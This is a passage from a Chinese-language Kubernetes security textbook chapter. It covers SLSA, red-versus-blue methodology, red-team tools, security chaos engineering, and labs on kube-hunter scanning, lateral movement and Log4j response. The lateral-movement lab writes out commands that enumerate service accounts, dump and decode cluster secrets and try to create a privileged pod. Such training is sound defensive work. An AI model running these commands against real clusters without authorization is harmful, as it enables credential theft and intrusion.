# 4. 验证修复
trivy image --severity CRITICAL myapp:fixed | grep -i log4j || echo "Clean!"
```

### 7.7.3 SLSA 框架

SLSA（Supply-chain Levels for Software Artifacts）是 Google 提出的供应链安全框架：

| 级别 | 要求 | 说明 |
|------|------|------|
| **1** | 可验证的来源 | 构建过程有记录，可以追溯 |
| **2** | 托管构建 + 签名 | 使用托管的 CI/CD，输出签名 |
| **3** |  hardened 构建 | 构建环境隔离，不可变 |
| **4** | 双人审查 + hermetic | 所有变更双人审查，封闭构建 |

**SLSA 与容器的结合**：
```yaml
# 使用 Sigstore/Cosign 实现 SLSA Level 3
# 1. 在 GitHub Actions 中构建（托管环境）
# 2. 使用 OIDC 身份签名（无密钥）
# 3. 上传到 Rekor 透明度日志
# 4. 验证时检查 SLSA 证明
```

---

## 7.8 红蓝对抗与混沌工程

### 7.8.1 红蓝对抗方法论

```
红队（攻击方）                    蓝队（防御方）
    │                                │
    ├── 侦察（Reconnaissance）      ├── 监控和检测
    │   • 暴露面扫描                │   • Falco/Cilium 告警
    │   • 服务指纹识别              │   • 日志分析
    │                                │
    ├── 初始访问（Initial Access）  ├── 边界防御
    │   • 漏洞利用                  │   • WAF/ingress 规则
    │   • 凭证窃取                  │   • 认证强化
    │                                │
    ├── 横向移动（Lateral Movement）├── 内部隔离
    │   • Pod 间扫描                │   • NetworkPolicy
    │   • Token 窃取                │   • RBAC 最小化
    │                                │
    ├── 数据收集（Collection）      ├── 数据保护
    │   • Secret 读取               │   • etcd 加密
    │   • 日志收集                  │   • 访问审计
    │                                │
    └── 影响（Impact）              └── 响应和恢复
        • 加密挖矿                      • 自动隔离
        • 数据删除                      • 备份恢复
```

**Kubernetes 红队常用工具**：

| 工具 | 用途 | 场景 |
|------|------|------|
| **kube-hunter** | K8s 渗透测试 | 自动扫描集群漏洞 |
| **peirates** | K8s 渗透 | ServiceAccount 滥用 |
| **kubectl** | 集群操作 | 合法工具用于恶意目的 |
| **etcdctl** | etcd 访问 | 数据窃取 |
| **Peirates** | K8s 渗透 | Pod 逃逸和横向移动 |
| **amicontained** | 容器环境检测 | 检查容器限制和逃逸可能 |

### 7.8.2 安全混沌工程

混沌工程（Chaos Engineering）在安全领域的应用：

```bash
# 使用 Litmus Chaos 进行安全混沌实验
# 1. 模拟特权 Pod 创建（验证准入控制）
# 2. 模拟异常网络连接（验证 Falco 检测）
# 3. 模拟凭证泄露（验证响应流程）

# Litmus 安全混沌实验示例
apiVersion: litmuschaos.io/v1alpha1
kind: ChaosEngine
metadata:
  name: security-chaos
  namespace: litmus
spec:
  appinfo:
    appns: 'production'
    applabel: 'app=backend'
    appkind: 'deployment'
  annotationCheck: 'true'
  engineState: 'active'
  chaosServiceAccount: litmus-admin
  experiments:
  - name: pod-security-policy
    spec:
      components:
        env:
        - name: TARGET_CONTAINER
          value: 'backend'
        # 尝试创建特权 Pod，验证准入控制是否阻止
```

---

## 7.9 补充实验

### 实验 7.5：kube-hunter 集群渗透扫描（25 分钟）

```bash
# 步骤 1：安装 kube-hunter
pip install kube-hunter

# 步骤 2：被动扫描（只监听网络流量，不主动攻击）
kube-hunter --interface --report json > passive-scan.json

# 步骤 3：主动扫描（需要谨慎，可能触发安全告警）
kube-hunter --remote <apiserver-ip> --report json > active-scan.json

# 步骤 4：分析结果
cat active-scan.json | jq '.vulnerabilities[] | {name: .name, severity: .severity, description: .description}'

# 步骤 5：在 Pod 内运行（模拟攻击者视角）
kubectl run kube-hunter --image=aquasec/kube-hunter --restart=Never -- --pod

# 清理
kubectl delete pod kube-hunter
```

### 实验 7.6：红队 - 横向移动演练（30 分钟）

```bash
# ⚠️ 警告：仅在隔离测试环境中进行！

# 场景：你攻破了一个 Pod，尝试在集群内横向移动

# 步骤 1：创建目标 Pod（模拟已攻破）
kubectl run compromised --image=bitnami/kubectl --restart=Never -- sleep 3600

# 步骤 2：进入 Pod，开始"攻击"
kubectl exec -it compromised -- /bin/sh

# 步骤 3：侦察 - 发现集群信息
env | grep KUBERNETES

# 步骤 4：侦察 - 列出所有命名空间
kubectl get ns

# 步骤 5：侦察 - 发现高权限 ServiceAccount
kubectl get sa -A
kubectl get clusterrolebinding -A | grep -i admin

# 步骤 6：尝试读取 Secret
kubectl get secrets -A
kubectl get secret <interesting-secret> -n <namespace> -o jsonpath='{.data}' | base64 -d

# 步骤 7：尝试创建特权 Pod（测试准入控制）
kubectl run escape --image=ubuntu --privileged 2>&1

# 步骤 8：退出并分析 Falco 日志（如果有）
exit
kubectl logs -n falco -l app.kubernetes.io/name=falco 2>/dev/null | grep -i "Unexpected\|Privilege"

# 清理
kubectl delete pod compromised
```

### 实验 7.7：Log4j 漏洞应急响应模拟（30 分钟）

```bash
# 步骤 1：拉取有漏洞的镜像
docker pull vulhub/log4j:2.14.1

# 步骤 2：扫描发现漏洞
trivy image --severity CRITICAL vulhub/log4j:2.14.1 | grep -A 5 -i log4j

# 步骤 3：模拟应急响应流程
# 3.1 识别影响范围（哪些服务使用这个镜像）
# 3.2 临时缓解（WAF 规则、JVM 参数）
# 3.3 修复（更新到 log4j 2.17.1+）
# 3.4 验证修复

# 步骤 4：构建修复后的镜像
cat <<'DOCKERFILE' > Dockerfile.fix
FROM vulhub/log4j:2.14.1
# 实际上应该更新基础镜像或应用依赖
# 这里仅演示流程
RUN echo "This is where you'd update log4j to 2.17.1+"
DOCKERFILE

# 步骤 5：验证修复后的镜像
trivy image --severity CRITICAL vulhub/log4j:2.17.1 2>/dev/null || echo "安全版本已不可用"

# 清理
rm Dockerfile.fix
```

---

## 7.10 本章小结（更新版）

| 主题 | 核心内容 | 关键工具 |
|------|---------|---------|
| **DevSecOps** | 安全左移、CI/CD 集成、成熟度模型 | GitLab CI, GitHub Actions |
| **GitOps 安全** | 仓库保护、加密 Secret、分支策略 | ArgoCD, Flux, Sealed Secrets |
| **供应链安全** | SLSA、SBOM、可重现构建 | Cosign, Syft |
| **攻击技术** | Kubelet 暴露、特权 Pod、Token 窃取、etcd 窃取、云元数据 | Kubernetes Goat |
| **供应链攻击** | SolarWinds、Log4j、Codecov | 漏洞管理、快速响应 |
| **防御策略** | PSS、RBAC 最小化、准入控制、运行时检测 | Kyverno, Falco |
| **事件响应** | PDCERF 模型、取证分析、自动化响应 | Falcosidekick, SOAR |
| **红蓝对抗** | 渗透测试、横向移动、检测验证 | kube-hunter, peirates |
| **混沌工程** | 安全韧性测试、故障注入 | Litmus Chaos |

**关键安全原则**：
1. **安全是每个人的责任**：不只是安全团队的事
2. **自动化优先**：安全检查和响应尽可能自动化
3. **假设 breach**：假设攻击者已经在环境中
4. **最小权限**：每个组件只有必要的权限
5. **持续改进**：从事故中学习，不断优化
6. **纵深防御**：多层安全机制叠加
7. **快速响应**：从检测到响应的时间越短越好

**安全检查清单**：
- [ ] CI/CD 中集成安全扫描（SAST、依赖扫描、镜像扫描）
- [ ] 镜像签名并验证
- [ ] 密钥泄露检测（pre-commit + CI）
- [ ] 准入控制策略部署（禁止特权容器、latest 标签）
- [ ] 运行时监控（Falco）
- [ ] NetworkPolicy 默认拒绝
- [ ] 事件响应流程定义
- [ ] 定期红蓝对抗演练
- [ ] 供应链安全（SLSA、SBOM）
- [ ] 漏洞修复 SLA

**下一步建议**：
1. 考取 CKA + CKS 认证
2. 参与开源安全项目（Falco、Trivy、Kubescape）
3. 搭建完整的企业级安全实验环境
4. 定期进行红蓝对抗演练
5. 关注 CVE 和云原生安全研究
